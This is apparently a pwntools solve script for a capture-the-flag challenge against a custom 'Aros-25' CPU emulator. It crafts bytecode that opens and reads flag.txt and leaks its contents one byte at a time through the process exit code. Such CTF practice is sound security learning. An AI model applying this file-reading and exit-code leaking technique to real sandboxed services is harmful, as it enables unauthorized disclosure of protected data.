#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF("build/Aros-25-cpu", checksec=False)

gs = '''
b .syscall_write
b .syscall_read
'''

context.arch = 'arm'

def start():
    if args.GDB:
        return gdb.debug([elf.path, "build/test.aros"], gdbscript=gs, aslr=True)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(["qemu-arm", elf.path, "build/test.aros"], close_fds=False)


#shellcode = asm('\n'.join([
    
#]))

a = b"\x61"
b = b"\x62"
c = b"\x63"
d = b"\x64"
e = b"\x65"
f = b"\x66"
g = b"\x67"
s = b"\x73"

def mov_val(reg: bytes, val: int) -> bytes:
    return b"\x01" + reg + val.to_bytes(4, byteorder="little")

def mov_reg(reg_to: bytes, reg_from: bytes) -> bytes:
    return b"\x02" + reg_to + reg_from

def add(reg_save: bytes, reg1: bytes, reg2: bytes) -> bytes:
    return b"\x03" + reg_save + reg1 + reg2

def store(reg_from: bytes, reg_to: bytes) -> bytes:
    return b"\x07" + reg_from + reg_to

def load(reg_to: bytes, reg_from: bytes) -> bytes:
    return b"\x08" + reg_to + reg_from

def syscall() -> bytes:
    return b"\x06"

def push(reg: bytes) -> bytes:
    return b"\x04" + reg

def pop(reg: bytes) -> bytes:
    return b"\x05" + reg

# Test store operation
"""
p = b"aros"
p += mov_val(a, 0x40)
p += mov_val(s, 0x3) # mmap syscall
p += syscall()
p += mov_reg(b, a)
p += mov_val(c, 0x13)
p += store(c, b)
p += mov_val(d, 0x14)
p += b"\xff\xff\xff\xff"
"""

# Test load operation
"""
p = b"aros"
p += mov_val(a, 0x40)
p += mov_val(s, 0x3) # mmap syscall
p += syscall()
p += mov_reg(b, a)
p += mov_val(c, 0x14)
p += store(c, b)
p += load(d, b) # should load 0x14 into d
p += mov_val(e, 0x15)
p += b"\xff\xff\xff\xff"
"""

# Test open read write - leak first value
"""
# Allocate memory
p = b"aros"
p += mov_val(a, 0x40) # size, but will allocate page aligned anyway
p += mov_val(s, 0x3) # mmap syscall
p += syscall()

# Save memory pointer for later use
p += push(a) # Save a original memory pointer
p += push(a) # Save a original memory pointer for when we need to read into memory

# Write flag.txt to the memory
p += mov_val(b, 0x67616c66) # flag
p += store(b, a)
p += mov_val(c, 0x4)
p += add(a, a, c) # increment a to write .txt 
p += mov_val(b, 0x7478742e) # .txt
p += store(b, a)
p += pop(a) # restore a original memory pointer

# Open flag.txt
p += mov_val(b, 0x0)
p += mov_val(c, 0x3) # O_RDONLY
p += mov_val(s, 0x0) # syscall open
p += syscall()
# Read flag.txt
# a now contains the fd
p += pop(b) # original mmap memory
p += mov_val(c, 0x10)
p += add(b, b, c) # increment so we don't overwrite flag.txt (validate the memory is layed out correctly
p += mov_val(c, 0x40) # count to read
p += mov_val(s, 0x1) # syscall read
p += syscall()

# Load and exit
p += mov_val(c, 0xf) # get last byte of flag
p += add(b, b, c)
p += load(a, b)
p += mov_val(s, 0x4) # syscall exit
p += syscall()

p += b"\xff\xff\xff\xff"
"""

result = ""

counter = 0x0
while True:
    # Allocate memory
    p = b"aros"
    p += mov_val(a, 0x40) # size, but will allocate page aligned anyway
    p += mov_val(s, 0x3) # mmap syscall
    p += syscall()

    # Save memory pointer for later use
    p += push(a) # Save a original memory pointer
    p += push(a) # Save a original memory pointer for when we need to read into memory

    # Write flag.txt to the memory
    p += mov_val(b, 0x67616c66) # flag
    p += store(b, a)
    p += mov_val(c, 0x4)
    p += add(a, a, c) # increment a to write .txt 
    p += mov_val(b, 0x7478742e) # .txt
    p += store(b, a)
    p += pop(a) # restore a original memory pointer

    # Open flag.txt
    p += mov_val(b, 0x0)
    p += mov_val(c, 0x3) # O_RDONLY
    p += mov_val(s, 0x0) # syscall open
    p += syscall()
    # Read flag.txt
    # a now contains the fd
    p += pop(b) # original mmap memory
    p += mov_val(c, 0x10) # bytes
    p += add(b, b, c) # increment so we don't overwrite flag.txt (validate the memory is layed out correctly
    p += mov_val(c, 0x50) # count to read
    p += mov_val(s, 0x1) # syscall read
    p += syscall()

    # Load and exit
    p += mov_val(c, counter) # get first byte of the flag
    p += add(b, b, c)
    p += load(a, b)
    p += mov_val(s, 0x4) # syscall exit
    p += syscall()

    p += b"\xff\xff\xff\xff"

    if counter == 0x20:
        break

    counter = counter + 1

    try:
        io = start()

        io.sendafter(b"Aros-25 CPU\n", p)

        io.wait()
        code = io.poll()
        print(f"Exit code: {code} char: {chr(code)}")
        result = result + chr(code)
    except Exception as e:
        io.close()

print("Flag is:", str(result))

"""
with open("flag.txt", 'w') as file:
    file.write("kalmar{practice}")

with open("build/test.aros", 'wb') as file:
    file.write(p)
"""

"""
# Test write segfault
# Allocate memory
p = b"aros"
p += mov_val(a, 0x40) # size, but will allocate page aligned anyway
p += mov_val(s, 0x3) # mmap syscall
p += syscall()

# Save memory pointer for later use
p += push(a) # Save a original memory pointer
p += push(a) # Save a original memory pointer for when we need to read into memory

# Write flag.txt to the memory
p += mov_val(b, 0x67616c66) # flag
p += store(b, a)
p += mov_val(c, 0x4)
p += add(a, a, c) # increment a to write .txt 
p += mov_val(b, 0x7478742e) # .txt
p += store(b, a)
p += pop(a) # restore a original memory pointer

# Open flag.txt
p += mov_val(b, 0x0)
p += mov_val(c, 0x3) # O_RDONLY
p += mov_val(s, 0x0) # syscall open
p += syscall()

# Read flag.txt
# a now contains the fd
p += pop(b) # original mmap memory
p += mov_val(c, 0x10)
p += add(b, b, c) # increment so we don't overwrite flag.txt (validate the memory is layed out correctly
p += mov_val(c, 0xf) # count to read
p += mov_val(s, 0x1) # syscall read
p += syscall()

# "Write" flag to stdout
# b should contain memory
p += mov_val(e, 0x10)
p += mov_val(a, 0x1) # fd
p += mov_val(c, 0x50) # count
p += mov_val(s, 0x2) # syscall write
p += syscall()
p += mov_val(c, 0x50) # count
p += mov_val(s, 0x2) # syscall write
"""

"""
io = start()

io.sendafter(b"Aros-25 CPU\n", p)

io.wait()
code = io.poll()
print(f"Exit code: {code} char: {chr(code)}")

io.interactive()
"""
